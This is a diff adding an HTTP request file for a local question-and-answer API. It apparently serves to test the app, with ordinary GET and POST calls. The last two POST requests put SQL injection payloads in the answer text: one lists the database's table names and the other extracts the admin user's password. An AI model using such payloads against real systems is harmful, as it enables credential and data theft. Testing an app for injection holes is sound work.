@@ -1,0 +1,38 @@
+GET http://localhost:3001/api/questions HTTP/1.1
+###
+GET http://localhost:3001/api/questions/1/answers HTTP/1.1
+###
+POST http://localhost:3001/api/answers HTTP/1.1
+Content-Type: application/json
+
+{
+    "text": "Text of the new answer",
+    "respondent": "Bob",
+    "score": 0,
+    "date": "2024-05-06",
+    "questionId": 1
+}
+
+###
+POST http://localhost:3001/api/answers HTTP/1.1
+Content-Type: application/json
+
+{
+    "text": "' || (SELECT tbl_name FROM sqlite_master  WHERE type='table' and tbl_name NOT like 'sqlite_%'))-- ",
+    "respondent": "Bob",
+    "score": 0,
+    "date": "2024-05-06",
+    "questionId": 1
+}
+
+###
+POST http://localhost:3001/api/answers HTTP/1.1
+Content-Type: application/json
+
+{
+    "text": "' || (SELECT password FROM users WHERE username='admin' LIMIT 1))-- ",
+    "respondent": "Bob",
+    "score": 0,
+    "date": "2024-05-06",
+    "questionId": 1
+}
